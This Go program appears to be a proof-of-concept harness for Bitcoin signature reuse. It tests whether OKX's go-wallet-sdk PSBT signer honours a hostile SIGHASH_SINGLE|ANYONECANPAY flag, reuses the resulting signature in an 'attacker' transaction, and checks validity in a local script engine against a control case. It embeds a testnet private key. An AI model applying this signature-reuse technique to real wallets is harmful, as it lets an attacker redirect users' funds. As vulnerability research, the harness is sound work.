package main

import (
	"bytes"
	"encoding/hex"
	"fmt"

	"github.com/btcsuite/btcd/btcutil"
	"github.com/btcsuite/btcd/btcutil/psbt"
	"github.com/btcsuite/btcd/chaincfg/chainhash"
	"github.com/btcsuite/btcd/txscript"
	"github.com/btcsuite/btcd/wire"
	"github.com/okx/go-wallet-sdk/coins/bitcoin"
)

const wif = "cPnvkvUYyHcSSS26iD1dkrJdV7k1RoUqJLhn3CYxpo398PdLVE22"

func buildHostile(declared byte) (string, []byte, error) {
	w, _ := btcutil.DecodeWIF(wif)
	h := btcutil.Hash160(w.PrivKey.PubKey().SerializeCompressed())
	spk, _ := bitcoin.PayToPubKeyHashScript(h)
	fund := wire.NewMsgTx(2)
	fund.AddTxIn(wire.NewTxIn(&wire.OutPoint{Hash: chainhash.Hash{0xb1}, Index: 0}, nil, nil))
	fund.AddTxOut(wire.NewTxOut(100000, spk))
	tx := wire.NewMsgTx(2)
	tx.AddTxIn(wire.NewTxIn(&wire.OutPoint{Hash: chainhash.Hash{0xb2}, Index: 0}, nil, nil))
	tx.AddTxIn(wire.NewTxIn(&wire.OutPoint{Hash: fund.TxHash(), Index: 0}, nil, nil))
	tx.AddTxOut(wire.NewTxOut(90000, spk))
	pkt, err := psbt.NewFromUnsignedTx(tx)
	if err != nil { return "", nil, err }
	pkt.Inputs[0].NonWitnessUtxo = fund
	pkt.Inputs[1].NonWitnessUtxo = fund
	pkt.Inputs[1].SighashType = txscript.SigHashType(declared)
	var b bytes.Buffer
	if err := pkt.Serialize(&b); err != nil { return "", nil, err }
	return hex.EncodeToString(b.Bytes()), spk, nil
}

func sigFor(psbtHex string, i int) []byte {
	w, _ := btcutil.DecodeWIF(wif)
	pub := w.PrivKey.PubKey().SerializeCompressed()
	signed, err := bitcoin.SignRawPSBTTransaction(psbtHex, wif)
	if err != nil { return nil }
	raw, _ := hex.DecodeString(signed)
	p, err := psbt.NewFromRawBytes(bytes.NewReader(raw), false)
	if err != nil { return nil }
	for _, ps := range p.Inputs[i].PartialSigs {
		if bytes.Equal(ps.PubKey, pub) { return ps.Signature }
	}
	return nil
}

func run(label string, declared byte) {
	psbtHex, spk, err := buildHostile(declared)
	if err != nil { fmt.Printf("CELL %s build err=%v\n", label, err); return }
	sig := sigFor(psbtHex, 1)
	if sig == nil { fmt.Printf("CELL %s no signature\n", label); return }
	w, _ := btcutil.DecodeWIF(wif)
	pub := w.PrivKey.PubKey().SerializeCompressed()

	atk := wire.NewMsgTx(2)
	atk.AddTxIn(wire.NewTxIn(&wire.OutPoint{Hash: chainhash.Hash{0xc1}, Index: 0}, nil, nil))
	atk.AddTxIn(wire.NewTxIn(&wire.OutPoint{Hash: chainhash.Hash{0xc2}, Index: 0}, nil, nil))
	attackerScript, _ := bitcoin.PayToPubKeyHashScript(bytes.Repeat([]byte{0x55}, 20))
	atk.AddTxOut(wire.NewTxOut(99900, attackerScript))

	sigScript, serr := txscript.NewScriptBuilder().
		AddData(sig).AddData(pub).Script()
	if serr != nil { fmt.Printf("CELL %s script build err=%v\n", label, serr); return }
	atk.TxIn[1].SignatureScript = sigScript

	vm, verr := txscript.NewEngine(spk, atk, 1, txscript.StandardVerifyFlags, nil, nil, 100000, nil)
	if verr != nil { fmt.Printf("CELL %s engine err=%v\n", label, verr); return }
	exec := vm.Execute()
	fmt.Printf("CELL %s declared=0x%02x script_engine_accepts_attacker_tx=%v err=%v\n", label, declared, exec == nil, exec)
}

func main() {
	run("A1-single-0x83", 0x83)
	run("A2-control-0x01", 0x01)
}
